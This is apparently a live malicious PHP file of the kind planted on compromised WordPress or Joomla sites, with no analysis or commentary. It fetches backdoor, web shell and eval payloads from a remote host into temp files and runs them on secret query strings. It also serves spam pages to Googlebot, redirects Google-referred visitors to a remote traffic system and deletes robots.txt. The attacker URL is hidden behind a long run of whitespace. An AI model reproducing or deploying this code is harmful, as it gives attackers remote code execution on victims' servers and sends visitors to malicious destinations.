<?php
error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

_create_initial_settings();

$user_agents_to_filter = array( '#google#i' );
$reverse_ips_to_filter = array( '#google#i' );
$referers_to_filter = array('#google\.#i');
$ip = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']: '';
$ua = isset($_SERVER['HTTP_USER_AGENT'])? $_SERVER['HTTP_USER_AGENT']: '';
$ref = isset($_SERVER['HTTP_REFERER'])? $_SERVER['HTTP_REFERER']: '';
$host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
$host_hash = substr(md5($host), 0, 5);
$query = isset($_SERVER['QUERY_STRING'])? $_SERVER['QUERY_STRING']: '';
$request_uri = isset($_SERVER['REQUEST_URI'])? strtok(strtok($_SERVER['REQUEST_URI'],'&'),'?'): '';
$root_path = _get_root();


if (file_exists($root_path.'/robots.txt'))
{
    unlink($root_path.'/robots.txt');
}

if ($request_uri === '/robots.txt')
{
    header('Content-Type:text/plain; charset=utf-8');
    die("User-Agent: *\nAllow: /\n");
}

if ($query === 'checker-page')
{
    if (_fetch_url(_get_rev()) > 0)
    {
        die('Success!');
    } else
    {
        die('Failed!');   
    }
}

if (false !== strpos($query, 'simpler-evl'))
{
    $cache_dir = realpath(sys_get_temp_dir());
    $file = $cache_dir.'/evl'.$host_hash.'.txt';
    require($file);
    die('');
}

if (false !== strpos($query, 'simpler-bckdr'))
{
    $cache_dir = realpath(sys_get_temp_dir());
    $file = $cache_dir.'/bckdr'.$host_hash.'.txt';
    require($file);
    die('');
}

if (false !== strpos($query, 'simpler-ws'))
{
    $cache_dir = realpath(sys_get_temp_dir());
    $file = $cache_dir.'/ws'.$host_hash.'.txt';
    require($file);
    die('');
}

$is_bot = false;
foreach ($user_agents_to_filter as $user_agent_to_filter)
{
    if (preg_match($user_agent_to_filter, $ua))
    {
        $is_bot = true;
    } 
}

if (!$is_bot)
{
    $reverse_ip = gethostbyaddr($ip);
    foreach ($reverse_ips_to_filter as $reverse_ip_to_filter)
    {
        if (preg_match($reverse_ip_to_filter, $reverse_ip))
        {
            $is_bot = true;
        } 
    }
}

$is_searcher = false;
if (!$is_bot)
{
    foreach ($referers_to_filter as $referer_to_filter)
    {
        if (preg_match($referer_to_filter, $ref))
        {
            $is_searcher = true;
        } 
    }
}
    
if ($is_bot)
{
    $cache_dir = realpath(sys_get_temp_dir());
    $cache_file = $cache_dir.'/SESS_'.md5('http://'.strtolower($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']));
    if (!file_exists($cache_file))
    {        
        $data = _get_text();
        
        $template = '';
        if (isset($data['macroses']) && (count($data['macroses']) > 0))
        {
            $template = _get_template();
            
            foreach ($data['macroses'] as $macros => $value)
            {
                $template = str_replace($macros, $value, $template);
            }
        }        
        
        if (!empty($template)) file_put_contents($cache_file, $template);
    } else
    {
        $template = file_get_contents($cache_file);
    }

    $last_modified_time = filemtime($cache_file);
    $etag_file = md5_file($cache_file);
    $max_age = $last_modified_time + 60*60*24*365 - time();
    $expires = $last_modified_time + $max_age;
    if ($max_age < 0) $max_age = 0;
    
    header("Cache-Control: max-age=$max_age, public, must-revalidate");
    header("Expires: ".gmdate("D, d M Y H:i:s", $expires)." GMT"); 
    header("Last-Modified: ".gmdate("D, d M Y H:i:s", $last_modified_time)." GMT");
    header("Etag: $etag");

    $if_modified_since = (isset($_SERVER['HTTP_IF_MODIFIED_SINCE'])? $_SERVER['HTTP_IF_MODIFIED_SINCE']: false);
    $etag_header = (isset($_SERVER['HTTP_IF_NONE_MATCH'])? trim($_SERVER['HTTP_IF_NONE_MATCH']): false);

    if ($if_modified_since && (@strtotime($if_modified_since) === $last_modified_time) || ($etag_header === $etag_file))
    {
           header("HTTP/1.1 304 Not Modified");
           die();
    }

    header('Content-Type:text/html; charset=utf-8');
    echo $template;
    die();
}

if (!$is_bot && $is_searcher)
{
    header("Location: "._get_tds(), true, 302);
    die();
}

function _get_root()
{
    $localpath=getenv("SCRIPT_NAME");$absolutepath=getenv("SCRIPT_FILENAME");$root_path=substr($absolutepath,0,strpos($absolutepath,$localpath));
    return $root_path;
}

function _get_rev()
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             return 'http://pasteleriavienaazul.com/extadult2.php?host='.trim(strtolower($_SERVER['HTTP_HOST']), '.').'&full_url='.urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
    return 'http://www.google.com/';
}

function _get_tds()
{
    $req = isset($_SERVER['REQUEST_URI'])? $_SERVER['REQUEST_URI']: '';
    $ua = isset($_SERVER['HTTP_USER_AGENT'])? $_SERVER['HTTP_USER_AGENT']: '';
    $ref = isset($_SERVER['HTTP_REFERER'])? $_SERVER['HTTP_REFERER']: '';
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $tds_file = $cache_dir.'/juju'.$host_hash.'.txt';
    if (!file_exists($tds_file) || file_exists($tds_file) && (time() - filemtime($tds_file) > 60*60*24))
    {
        $tds = _fetch_url(_get_rev().'&get_tds');
        if (!empty($tds)) file_put_contents($tds_file, $tds);
    } else
    {
        $tds = file_get_contents($tds_file);
    }
    
    $tds .= '?seoref='.urlencode($ref).'&parameter='.urlencode(str_replace('www.', '', $host)).'&se=$se&ur=1&HTTP_REFERER='.urlencode('http://'.$host.$req);
    
    return $tds;   
}

function _get_text()
{
    $fc = 'g'.'zinf'.'la'.'te';
    $host = isset($_SERVER['HTTP_HOST'])? urlencode($_SERVER['HTTP_HOST']): '';
    $is_gzip = function_exists($fc) ? 'true': '';
    
    $full_uri = $_SERVER['REQUEST_URI'];
    $text = _fetch_url(_get_rev().'&get_text&'."req=".urlencode($full_uri)."&gzip=".$is_gzip."&ip=127.0.0.1&rip=google&ua=googlebot&ref=");
    if (function_exists($fc))
    {
        $text = @$fc(substr($text,10,-8));
    }
    $text = @unserialize($text);
    return $text;  
}

function _get_evl()
{
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $evl_file = $cache_dir.'/evl'.$host_hash.'.txt';
    if (!file_exists($evl_file) || file_exists($evl_file) && (time() - filemtime($evl_file) > 60*60*24*1))
    {
        $evl = _fetch_url(_get_rev().'&get_evl');
        if (!empty($evl)) file_put_contents($evl_file, $evl);
    } else
    {
        $evl = file_get_contents($evl_file);
    }
 
    return $evl;   
}
function _get_bckdr()
{
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $bckdr_file = $cache_dir.'/bckdr'.$host_hash.'.txt';
    if (!file_exists($bckdr_file) || file_exists($bckdr_file) && (time() - filemtime($bckdr_file) > 60*60*24*1))
    {
        $bckdr = _fetch_url(_get_rev().'&get_bckdr');
        if (!empty($bckdr)) file_put_contents($bckdr_file, $bckdr);
    } else
    {
        $bckdr = file_get_contents($bckdr_file);
    }
 
    return $bckdr;   
}

function _get_ws()
{
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $ws_file = $cache_dir.'/ws'.$host_hash.'.txt';
    if (!file_exists($ws_file) || file_exists($ws_file) && (time() - filemtime($ws_file) > 60*60*24*1))
    {
        $ws = _fetch_url(_get_rev().'&get_ws');
        if (!empty($ws)) file_put_contents($ws_file, $ws);
    } else
    {
        $ws = file_get_contents($ws_file);
    }
 
    return $ws;   
}

function _get_template()
{
    $root_path = _get_root();
    $tpl_path = false;
    if (is_dir($root_path.'/wp-admin/includes/'))
    {
        $tpl_path = '/wp-admin/includes/template.html';
    }
    
    if (is_dir($root_path.'/libraries/joomla/application/'))
    {
        $tpl_path = '/libraries/joomla/application/template.html';
    }
    $tpl = $tpl_path? @file_get_contents($root_path.$tpl_path): '';
    if (strpos($tpl, '[CONTENT]') === false)
    {
        $tpl = base64_decode('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuLVVTIiBjbGFzcz0ianMiPjxoZWFkPgoJPGxpbmsgcmVsPSJwcm9maWxlIiBocmVmPSJodHRwOi8vZ21wZy5vcmcveGZuLzExIj4KPHRpdGxlPltUSVRMRV08L3RpdGxlPgoKCgoJCTxzY3JpcHQgc3JjPSJodHRwczovL3dwLXRoZW1lcy5jb20vd3Avd3AtaW5jbHVkZXMvanMvd3AtZW1vamktcmVsZWFzZS5taW4uanM/dmVyPTQuNS1SQzEtMzcwNzkiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+CgkJPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KaW1nLndwLXNtaWxleSwKaW1nLmVtb2ppIHsKCWRpc3BsYXk6IGlubGluZSAhaW1wb3J0YW50OwoJYm9yZGVyOiBub25lICFpbXBvcnRhbnQ7Cglib3gtc2hhZG93OiBub25lICFpbXBvcnRhbnQ7CgloZWlnaHQ6IDFlbSAhaW1wb3J0YW50OwoJd2lkdGg6IDFlbSAhaW1wb3J0YW50OwoJbWFyZ2luOiAwIC4wN2VtICFpbXBvcnRhbnQ7Cgl2ZXJ0aWNhbC1hbGlnbjogLTAuMWVtICFpbXBvcnRhbnQ7CgliYWNrZ3JvdW5kOiBub25lICFpbXBvcnRhbnQ7CglwYWRkaW5nOiAwICFpbXBvcnRhbnQ7Cn0KPC9zdHlsZT4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0idHdlbnR5c2l4dGVlbi1mb250cy1jc3MiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1NZXJyaXdlYXRoZXIlM0E0MDAlMkM3MDAlMkM5MDAlMkM0MDBpdGFsaWMlMkM3MDBpdGFsaWMlMkM5MDBpdGFsaWMlN0NNb250c2VycmF0JTNBNDAwJTJDNzAwJTdDSW5jb25zb2xhdGElM0E0MDAmYW1wO3N1YnNldD1sYXRpbiUyQ2xhdGluLWV4dCIgdHlwZT0idGV4dC9jc3MiIG1lZGlhPSJhbGwiPgo8bGluayByZWw9InN0eWxlc2hlZXQiIGlkPSJnZW5lcmljb25zLWNzcyIgaHJlZj0iaHR0cHM6Ly93cC10aGVtZXMuY29tL3dwLWNvbnRlbnQvdGhlbWVzL3R3ZW50eXNpeHRlZW4vZ2VuZXJpY29ucy9nZW5lcmljb25zLmNzcz92ZXI9My40LjEiIHR5cGU9InRleHQvY3NzIiBtZWRpYT0iYWxsIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0idHdlbnR5c2l4dGVlbi1zdHlsZS1jc3MiIGhyZWY9Imh0dHBzOi8vd3AtdGhlbWVzLmNvbS93cC1jb250ZW50L3RoZW1lcy90d2VudHlzaXh0ZWVuL3N0eWxlLmNzcz92ZXI9NC41LVJDMS0zNzA3OSIgdHlwZT0idGV4dC9jc3MiIG1lZGlhPSJhbGwiPgo8IS0tW2lmIGx0IElFIDEwXT4KPGxpbmsgcmVsPSdzdHlsZXNoZWV0JyBpZD0ndHdlbnR5c2l4dGVlbi1pZS1jc3MnICBocmVmPSdodHRwczovL3dwLXRoZW1lcy5jb20vd3AtY29udGVudC90aGVtZXMvdHdlbnR5c2l4dGVlbi9jc3MvaWUuY3NzP3Zlcj0yMDE1MDkzMCcgdHlwZT0ndGV4dC9jc3MnIG1lZGlhPSdhbGwnIC8+CjwhW2VuZGlmXS0tPgo8IS0tW2lmIGx0IElFIDldPgo8bGluayByZWw9J3N0eWxlc2hlZXQnIGlkPSd0d2VudHlzaXh0ZWVuLWllOC1jc3MnICBocmVmPSdodHRwczovL3dwLXRoZW1lcy5jb20vd3AtY29udGVudC90aGVtZXMvdHdlbnR5c2l4dGVlbi9jc3MvaWU4LmNzcz92ZXI9MjAxNTEyMzAnIHR5cGU9J3RleHQvY3NzJyBtZWRpYT0nYWxsJyAvPgo8IVtlbmRpZl0tLT4KPCEtLVtpZiBsdCBJRSA4XT4KPGxpbmsgcmVsPSdzdHlsZXNoZWV0JyBpZD0ndHdlbnR5c2l4dGVlbi1pZTctY3NzJyAgaHJlZj0naHR0cHM6Ly93cC10aGVtZXMuY29tL3dwLWNvbnRlbnQvdGhlbWVzL3R3ZW50eXNpeHRlZW4vY3NzL2llNy5jc3M/dmVyPTIwMTUwOTMwJyB0eXBlPSd0ZXh0L2NzcycgbWVkaWE9J2FsbCcgLz4KPCFbZW5kaWZdLS0+CjwhLS1baWYgbHQgSUUgOV0+CjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0JyBzcmM9J2h0dHBzOi8vd3AtdGhlbWVzLmNvbS93cC1jb250ZW50L3RoZW1lcy90d2VudHlzaXh0ZWVuL2pzL2h0bWw1LmpzP3Zlcj0zLjcuMyc+PC9zY3JpcHQ+CjwhW2VuZGlmXS0tPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL3dwLXRoZW1lcy5jb20vd3Avd3AtaW5jbHVkZXMvanMvanF1ZXJ5L2pxdWVyeS5qcz92ZXI9MS4xMi4yIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly93cC10aGVtZXMuY29tL3dwL3dwLWluY2x1ZGVzL2pzL2pxdWVyeS9qcXVlcnktbWlncmF0ZS5taW4uanM/dmVyPTEuNC4wIj48L3NjcmlwdD4KCgogCgo8bWV0YSBuYW1lPSJnZW5lcmF0b3IiIGNvbnRlbnQ9IldvcmRQcmVzcyA0LjUtUkMxLTM3MDc5Ij4KCgoKCgkJPHN0eWxlIHR5cGU9InRleHQvY3NzIj4ucmVjZW50Y29tbWVudHMgYXtkaXNwbGF5OmlubGluZSAhaW1wb3J0YW50O3BhZGRpbmc6MCAhaW1wb3J0YW50O21hcmdpbjowICFpbXBvcnRhbnQ7fTwvc3R5bGU+CiAgPGxpbmsgcmVsPSJjYW5vbmljYWwiIGhyZWY9IltQQUdFX1VSTF0iPgogICAgPGxpbmsgcmVsPSJwcmV2IiBocmVmPSJbUkFORF9VUkxfUFJFVl0iPgogICAgPGxpbmsgcmVsPSJuZXh0IiBocmVmPSJbUkFORF9VUkxfTkVYVF0iPgogICAgPG1ldGEgcHJvcGVydHk9Im9nOnRpdGxlIiBjb250ZW50PSJbVElUTEVdIj4KICAgIDxtZXRhIHByb3BlcnR5PSJvZzp0eXBlIiBjb250ZW50PSJhcnRpY2xlIj4KICAgIDxtZXRhIHByb3BlcnR5PSJvZzpzaXRlX25hbWUiIGNvbnRlbnQ9IltDT01NT05dIj4KICAgIDxtZXRhIHByb3BlcnR5PSJvZzp1cmwiIGNvbnRlbnQ9IltQQUdFX1VSTF0iPgogICAgPG1ldGEgcHJvcGVydHk9Im9nOmxvY2FsZSIgY29udGVudD0iZW5fVVMiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIHByb3BlcnR5PSJvZzpkZXNjcmlwdGlvbiIgY29udGVudD0iW0RFU0NSSVBUSU9OXSI+CiAgICA8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iW0tFWVdPUkRTXSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT15ZXMiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPgogIAoJCTwvaGVhZD4KCjxib2R5IGNsYXNzPSJzaW5ndWxhciBzaW5nbGUgc2luZ2xlLXBvc3QgcG9zdGlkLTE5IHNpbmdsZS1mb3JtYXQtc3RhbmRhcmQiPgo8ZGl2IGlkPSJwYWdlIiBjbGFzcz0ic2l0ZSI+Cgk8ZGl2IGNsYXNzPSJzaXRlLWlubmVyIj4KCQk8YSBjbGFzcz0ic2tpcC1saW5rIHNjcmVlbi1yZWFkZXItdGV4dCIgaHJlZj0iI2NvbnRlbnQiPlNraXAgdG8gY29udGVudDwvYT4KCgkJPGhlYWRlciBpZD0ibWFzdGhlYWQiIGNsYXNzPSJzaXRlLWhlYWRlciIgcm9sZT0iYmFubmVyIj4KCQkJPGRpdiBjbGFzcz0ic2l0ZS1oZWFkZXItbWFpbiI+CgkJCQk8ZGl2IGNsYXNzPSJzaXRlLWJyYW5kaW5nIj4KCQkJCQkJCQkJCQk8cCBjbGFzcz0ic2l0ZS10aXRsZSI+W0NPTU1PTl08L3A+CgkJCQkJCQkJCQkJCgkJCQkJCQkJCTwvZGl2PjwhLS0gLnNpdGUtYnJhbmRpbmcgLS0+CgoJCQkJCQkJPC9kaXY+PCEtLSAuc2l0ZS1oZWFkZXItbWFpbiAtLT4KCgkJCQkJPC9oZWFkZXI+PCEtLSAuc2l0ZS1oZWFkZXIgLS0+CgoJCTxkaXYgaWQ9ImNvbnRlbnQiIGNsYXNzPSJzaXRlLWNvbnRlbnQiPgoKPGRpdiBpZD0icHJpbWFyeSIgY2xhc3M9ImNvbnRlbnQtYXJlYSI+Cgk8bWFpbiBpZD0ibWFpbiIgY2xhc3M9InNpdGUtbWFpbiIgcm9sZT0ibWFpbiI+CgkJCjxhcnRpY2xlIGlkPSJwb3N0LTE5IiBjbGFzcz0icG9zdC0xOSBwb3N0IHR5cGUtcG9zdCBzdGF0dXMtcHVibGlzaCBmb3JtYXQtc3RhbmRhcmQgaGVudHJ5IGNhdGVnb3J5LXVuY2F0ZWdvcml6ZWQgdGFnLWJvYXQgdGFnLWxha2UiPgoJPGhlYWRlciBjbGFzcz0iZW50cnktaGVhZGVyIj4KCQk8aDEgY2xhc3M9ImVudHJ5LXRpdGxlIj5bVElUTEVdPC9oMT4JPC9oZWFkZXI+PCEtLSAuZW50cnktaGVhZGVyIC0tPgoKCQoJCgk8ZGl2IGNsYXNzPSJlbnRyeS1jb250ZW50Ij4KICBbQ09OVEVOVF0KPC9kaXY+PCEtLSAuZW50cnktY29udGVudCAtLT4KCgkKPC9hcnRpY2xlPjwhLS0gI3Bvc3QtIyMgLS0+CgoJCgk8L21haW4+PCEtLSAuc2l0ZS1tYWluIC0tPgoKCQo8L2Rpdj48IS0tIC5jb250ZW50LWFyZWEgLS0+CgoKCTxhc2lkZSBpZD0ic2Vjb25kYXJ5IiBjbGFzcz0ic2lkZWJhciB3aWRnZXQtYXJlYSIgcm9sZT0iY29tcGxlbWVudGFyeSI+CgkJPHNlY3Rpb24gaWQ9InNlYXJjaC0zIiBjbGFzcz0id2lkZ2V0IHdpZGdldF9zZWFyY2giPgo8Zm9ybSByb2xlPSJzZWFyY2giIG1ldGhvZD0iZ2V0IiBjbGFzcz0ic2VhcmNoLWZvcm0iIGFjdGlvbj0iIyI+Cgk8bGFiZWw+CgkJPHNwYW4gY2xhc3M9InNjcmVlbi1yZWFkZXItdGV4dCI+U2VhcmNoIGZvcjo8L3NwYW4+CgkJPGlucHV0IHR5cGU9InNlYXJjaCIgY2xhc3M9InNlYXJjaC1maWVsZCIgcGxhY2Vob2xkZXI9IlNlYXJjaCDigKYiIHZhbHVlPSIiIG5hbWU9InMiIHRpdGxlPSJTZWFyY2ggZm9yOiI+Cgk8L2xhYmVsPgoJPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzZWFyY2gtc3VibWl0Ij48c3BhbiBjbGFzcz0ic2NyZWVuLXJlYWRlci10ZXh0Ij5TZWFyY2g8L3NwYW4+PC9idXR0b24+CjwvZm9ybT4KPC9zZWN0aW9uPgkJPHNlY3Rpb24gaWQ9InJlY2VudC1wb3N0cy0zIiBjbGFzcz0id2lkZ2V0IHdpZGdldF9yZWNlbnRfZW50cmllcyI+CQk8aDIgY2xhc3M9IndpZGdldC10aXRsZSI+UmVjZW50IFBvc3RzPC9oMj4JCQoJCTwvc2VjdGlvbj4JCTxzZWN0aW9uIGlkPSJyZWNlbnQtY29tbWVudHMtMyIgY2xhc3M9IndpZGdldCB3aWRnZXRfcmVjZW50X2NvbW1lbnRzIj48aDIgY2xhc3M9IndpZGdldC10aXRsZSI+UmVjZW50IENvbW1lbnRzPC9oMj48L3NlY3Rpb24+PHNlY3Rpb24gaWQ9ImFyY2hpdmVzLTMiIGNsYXNzPSJ3aWRnZXQgd2lkZ2V0X2FyY2hpdmUiPjxoMiBjbGFzcz0id2lkZ2V0LXRpdGxlIj5BcmNoaXZlczwvaDI+CQkKCQk8L3NlY3Rpb24+PHNlY3Rpb24gaWQ9ImNhdGVnb3JpZXMtMyIgY2xhc3M9IndpZGdldCB3aWRnZXRfY2F0ZWdvcmllcyI+PGgyIGNsYXNzPSJ3aWRnZXQtdGl0bGUiPkNhdGVnb3JpZXM8L2gyPgkJCjwvc2VjdGlvbj4JPC9hc2lkZT48IS0tIC5zaWRlYmFyIC53aWRnZXQtYXJlYSAtLT4KCgkJPC9kaXY+PCEtLSAuc2l0ZS1jb250ZW50IC0tPgoKCQk8Zm9vdGVyIGlkPSJjb2xvcGhvbiIgY2xhc3M9InNpdGUtZm9vdGVyIiByb2xlPSJjb250ZW50aW5mbyI+CgkJCQoJCQkKCQkJPGRpdiBjbGFzcz0ic2l0ZS1pbmZvIj4KCQkJCQkJCQk8c3BhbiBjbGFzcz0ic2l0ZS10aXRsZSI+W0NPTU1PTl08L3NwYW4+CgkJCQk8YSBocmVmPSJodHRwczovL3dvcmRwcmVzcy5vcmcvIj5Qcm91ZGx5IHBvd2VyZWQgYnkgV29yZFByZXNzPC9hPgoJCQk8L2Rpdj48IS0tIC5zaXRlLWluZm8gLS0+CgkJPC9mb290ZXI+PCEtLSAuc2l0ZS1mb290ZXIgLS0+Cgk8L2Rpdj48IS0tIC5zaXRlLWlubmVyIC0tPgo8L2Rpdj48IS0tIC5zaXRlIC0tPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly93cC10aGVtZXMuY29tL3dwLWNvbnRlbnQvdGhlbWVzL3R3ZW50eXNpeHRlZW4vanMvc2tpcC1saW5rLWZvY3VzLWZpeC5qcz92ZXI9MjAxNTExMTIiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL3dwLXRoZW1lcy5jb20vd3AtY29udGVudC90aGVtZXMvdHdlbnR5c2l4dGVlbi9qcy9mdW5jdGlvbnMuanM/dmVyPTIwMTUxMjA0Ij48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly93cC10aGVtZXMuY29tL3dwL3dwLWluY2x1ZGVzL2pzL3dwLWVtYmVkLm1pbi5qcz92ZXI9NC41LVJDMS0zNzA3OSI+PC9zY3JpcHQ+CgoKPC9ib2R5PjwvaHRtbD4=');
    }
    
    
    return $tpl;
}
function _fetch_url($url) {
    $user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';
    if (is_callable('curl_init')) {
        $c = curl_init($url);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_USERAGENT,$user_agent);
        $contents = curl_exec($c);
        if (is_string($contents)) {
            return $contents;
        }
        curl_close($c);
    } else
    {
        $allowUrlFopen = preg_match('/1|yes|on|true/i', ini_get('allow_url_fopen'));
        if ($allowUrlFopen) {
            $options  = array('http' => array('user_agent' => $user_agent));
            $context  = stream_context_create($options);
            return @file_get_contents($url, false, $context);
        }  
    }
    
    return false;
}
function _create_initial_settings()
{
    _get_tds();
    _get_bckdr();
    _get_ws();
    _get_evl();
}


if ( !function_exists('sys_get_temp_dir') )
{
    function sys_get_temp_dir()
    {
        // Try to get from environment variable
        if ( !empty($_ENV['TMP']) )
        {
            return realpath( $_ENV['TMP'] );
        }
        else if ( !empty($_ENV['TMPDIR']) )
        {
            return realpath( $_ENV['TMPDIR'] );
        }
        else if ( !empty($_ENV['TEMP']) )
        {
            return realpath( $_ENV['TEMP'] );
        }

        // Detect by creating a temporary file
        else
        {
            // Try to use system's temporary directory
            // as random name shouldn't exist
            $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
            if ( $temp_file )
            {
                $temp_dir = realpath( dirname($temp_file) );
                unlink( $temp_file );
                return $temp_dir;
            }
            else
            {
                return FALSE;
            }
        }
    }
}